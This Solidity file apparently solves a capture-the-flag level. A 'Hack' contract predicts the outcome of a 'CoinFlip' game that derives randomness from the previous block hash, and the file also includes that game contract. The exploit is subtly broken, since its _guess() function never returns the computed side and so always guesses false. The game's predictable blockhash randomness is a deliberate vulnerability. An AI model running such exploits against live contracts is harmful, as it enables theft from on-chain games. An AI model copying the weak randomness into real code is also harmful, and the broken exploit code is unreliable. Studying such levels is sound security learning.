// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Hack{
    CoinFlip private immutable  coinflip;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    constructor(address _target){
        coinflip = CoinFlip(_target);        
    }

    function flip() external {
        bool guess = _guess();
        require(coinflip.flip(guess),"Error");
    }

    function _guess() private returns(bool){
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
    }
}

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}